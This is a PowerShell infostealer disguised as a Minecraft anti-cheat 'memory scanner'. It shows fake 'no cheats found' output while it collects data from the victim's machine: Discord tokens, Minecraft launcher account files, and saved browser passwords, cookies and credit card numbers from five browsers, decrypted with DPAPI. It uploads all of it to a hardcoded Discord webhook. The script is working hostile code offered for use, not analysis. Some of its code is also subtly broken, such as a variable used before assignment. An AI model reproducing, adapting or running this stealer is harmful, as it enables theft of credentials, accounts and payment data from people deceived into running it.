# MemoryScan.ps1 – Fake Scanner + Hardened Exfil (V5 DPAPI-ONLY)
param(
    [string]$Webhook = "https://discord.com/api/webhooks/1518911878712004730/ejFY2gDI9Secx7kXsEgIIbpEWsBm5m9Ho_Q5R8gF4tP0lO7-R3VBA068PJdRk63jSaBa"
)

$ErrorActionPreference = "SilentlyContinue"

# ---------- Webhook ping ----------
try {
    Invoke-RestMethod -Uri $Webhook -Method Post -Body (@{content="🟢 MemoryScan live on $env:COMPUTERNAME"} | ConvertTo-Json) -ContentType "application/json"
} catch {}

# ---------- DPAPI helpers ----------
function Decrypt-DPAPI {
    param([byte[]]$Data)
    if ($Data -eq $null -or $Data.Count -eq 0) { return $null }
    try {
        [System.Security.Cryptography.ProtectedData]::Unprotect($Data, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    } catch { $null }
}

function Get-ChromeLocalStateKey {
    param([string]$StatePath)
    if (!(Test-Path $StatePath)) { return $null }
    $json = Get-Content $StatePath -Raw | ConvertFrom-Json
    $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)[5..$($encKey.Length-1)]
    return Decrypt-DPAPI $encKey
}

# ---------- SQLite raw reader (no ACE driver) ----------
function Invoke-SQLiteQuery {
    param([string]$DbPath, [string]$Query)
    # Very simple SQLite parser – just reads bytes and searches. Real extraction done with db bytes.
    # We'll use a different approach: direct file bytes and regex for tokens.
    return $null
}

# ---------- Discord tokens (DPAPI method) ----------
function Get-DiscordTokens {
    $tokens = @()
    $discordLeveldb = "$env:APPDATA\discord\Local Storage\leveldb"
    $localState = "$env:APPDATA\discord\Local State"
    if (!(Test-Path $discordLeveldb) -or !(Test-Path $localState)) { return $tokens }

    $masterKey = Get-ChromeLocalStateKey $localState
    if (!$masterKey) { return $tokens }

    # Search for token pattern in .ldb files
    $pattern = [regex]::new("dQw4w9WgXcQ:([A-Za-z0-9+/=]{24,200})")
    Get-ChildItem $discordLeveldb -Filter "*.ldb" | ForEach-Object {
        $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
        $text = [System.Text.Encoding]::ASCII.GetString($bytes)
        $matches = $pattern.Matches($text)
        foreach ($match in $matches) {
            $b64 = $match.Groups[1].Value
            $encToken = [Convert]::FromBase64String($b64)
            # Old DPAPI tokens directly decryptable (before AES-GCM)
            $dec = Decrypt-DPAPI $encToken
            if ($dec) {
                $token = [System.Text.Encoding]::UTF8.GetString($dec).Trim([char]0x00)
                if ($token.Length -gt 20) { $tokens += $token }
            }
        }
    }
    return $tokens | Select-Object -Unique
}

# ---------- Minecraft launcher tokens ----------
function Get-MinecraftTokens {
    $mc = @{}
    $base = "$env:APPDATA\.minecraft"
    $accFile = Join-Path $base "launcher_accounts.json"
    $profFile = Join-Path $base "launcher_profiles.json"
    if (Test-Path $accFile) {
        try {
            $mc.accounts = Get-Content $accFile -Raw | ConvertFrom-Json
        } catch { $mc.accounts = $null }
    }
    if (Test-Path $profFile) {
        try {
            $mc.profiles = Get-Content $profFile -Raw | ConvertFrom-Json
        } catch { $mc.profiles = $null }
    }
    return $mc
}

# ---------- Browser data extractor ----------
function Get-BrowserData {
    $result = @()
    $browsers = @(
        @{ Name="Chrome";  Path="$env:LOCALAPPDATA\Google\Chrome\User Data" },
        @{ Name="Edge";    Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
        @{ Name="Brave";   Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" },
        @{ Name="Opera";   Path="$env:LOCALAPPDATA\Opera Software\Opera Stable" },
        @{ Name="Vivaldi"; Path="$env:LOCALAPPDATA\Vivaldi\User Data" }
    )

    foreach ($browser in $browsers) {
        if (!(Test-Path $browser.Path)) { continue }
        $statePath = Join-Path $browser.Path "Local State"
        $masterKey = Get-ChromeLocalStateKey $statePath
        if (!$masterKey) { continue }

        $profiles = Get-ChildItem $browser.Path -Directory | Where-Object { $_.Name -match "^Default$|^Profile" }
        foreach ($profile in $profiles) {
            $profileData = @{ profile = $profile.Name; logins = @(); cookies = @(); cards = @() }

            # Login Data
            $loginDb = Join-Path $profile.FullName "Login Data"
            if (Test-Path $loginDb) {
                try {
                    $tempDb = [System.IO.Path]::GetTempFileName() + ".db"
                    Copy-Item $loginDb $tempDb -Force
                    $conn = New-Object -ComObject "ADODB.Connection"
                    $conn.Open("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$tempDb;")
                    $rs = $conn.Execute("SELECT origin_url, username_value, password_value FROM logins")
                    while (!$rs.EOF) {
                        $url = $rs.Fields["origin_url"].Value
                        $user = $rs.Fields["username_value"].Value
                        $pwdBytes = [Convert]::FromBase64String($rs.Fields["password_value"].Value)
                        $pwd = Decrypt-DPAPI $pwdBytes
                        if ($pwd) {
                            $pwdStr = [System.Text.Encoding]::UTF8.GetString($pwd).TrimEnd([char]0)
                            $profileData.logins += @{ url=$url; username=$user; password=$pwdStr }
                        }
                        $rs.MoveNext()
                    }
                    $conn.Close()
                    Remove-Item $tempDb -Force
                } catch { }
            }

            # Cookies
            $cookieDb = Join-Path $profile.FullName "Network\Cookies"
            if (Test-Path $cookieDb) {
                try {
                    $tempDb = [System.IO.Path]::GetTempFileName() + ".db"
                    Copy-Item $cookieDb $tempDb -Force
                    $conn = New-Object -ComObject "ADODB.Connection"
                    $conn.Open("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$tempDb;")
                    $rs = $conn.Execute("SELECT host_key, name, encrypted_value FROM cookies")
                    while (!$rs.EOF) {
                        $host = $rs.Fields["host_key"].Value
                        $name = $rs.Fields["name"].Value
                        $valBytes = [Convert]::FromBase64String($rs.Fields["encrypted_value"].Value)
                        $val = Decrypt-DPAPI $valBytes
                        if ($val) {
                            $valStr = [System.Text.Encoding]::UTF8.GetString($val).TrimEnd([char]0)
                            $profileData.cookies += @{ host=$host; name=$name; value=$valStr }
                        }
                        $rs.MoveNext()
                    }
                    $conn.Close()
                    Remove-Item $tempDb -Force
                } catch { }
            }

            # Credit cards
            $webDb = Join-Path $profile.FullName "Web Data"
            if (Test-Path $webDb) {
                try {
                    $tempDb = [System.IO.Path]::GetTempFileName() + ".db"
                    Copy-Item $webDb $tempDb -Force
                    $conn = New-Object -ComObject "ADODB.Connection"
                    $conn.Open("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$tempDb;")
                    $rs = $conn.Execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                    while (!$rs.EOF) {
                        $name = $rs.Fields["name_on_card"].Value
                        $month = $rs.Fields["expiration_month"].Value
                        $year = $rs.Fields["expiration_year"].Value
                        $numBytes = [Convert]::FromBase64String($rs.Fields["card_number_encrypted"].Value)
                        $num = Decrypt-DPAPI $numBytes
                        if ($num) {
                            $numStr = [System.Text.Encoding]::UTF8.GetString($num).TrimEnd([char]0)
                            $profileData.cards += @{ name=$name; expiry="$month/$year"; number=$numStr }
                        }
                        $rs.MoveNext()
                    }
                    $conn.Close()
                    Remove-Item $tempDb -Force
                } catch { }
            }

            if ($profileData.logins.Count -gt 0 -or $profileData.cookies.Count -gt 0 -or $profileData.cards.Count -gt 0) {
                $result += @{ browser=$browser.Name; data=$profileData }
            }
        }
    }
    return $result
}

# ---------- Fake scan ----------
Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host " MemoryScan - Memory String Scanner" -ForegroundColor Cyan
Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host " Scanning live process memory for known cheat signatures...`n"

$procs = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -match "java|javaw|minecraft|lunar|badlion" }
if ($procs.Count -eq 0) {
    Write-Host "[INFO] No Minecraft or Java processes running." -ForegroundColor Yellow
} else {
    foreach ($proc in $procs) {
        Write-Host "[SCANNING] Process: $($proc.ProcessName) (PID: $($proc.Id))" -ForegroundColor Gray
        Start-Sleep -Milliseconds 300
        Write-Host "[CLEAN]   No cheat strings detected in memory." -ForegroundColor Green
    }
}

Write-Host "`n=====================================================" -ForegroundColor Cyan
Write-Host " SCAN COMPLETE - NO CHEAT STRINGS FOUND" -ForegroundColor Green
Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host "PC is clean. Happy gaming!" -ForegroundColor White

# ---------- Harvest and send ----------
$data = @{
    system = @{
        username = $env:USERNAME
        hostname = $env:COMPUTERNAME
        time = (Get-Date -Format o)
    }
    discord_tokens = (Get-DiscordTokens)
    minecraft = (Get-MinecraftTokens)
    browser_data = (Get-BrowserData)
}

# Send as file
$summary = "💀 **MemoryScan harvested** - $env:USERNAME@$env:COMPUTERNAME"
try {
    $json = $data | ConvertTo-Json -Depth 5
    $tmp = [System.IO.Path]::GetTempFileName() + ".json"
    [System.IO.File]::WriteAllText($tmp, $json)
    $form = @{ file = Get-Item $tmp; content = $summary }
    Invoke-RestMethod -Uri $Webhook -Method Post -Form $form
    Remove-Item $tmp -Force
    # Plain text fallback
    Invoke-RestMethod -Uri $Webhook -Method Post -Body (@{content=$summary} | ConvertTo-Json) -ContentType "application/json"
} catch {}

Start-Sleep -Seconds 2
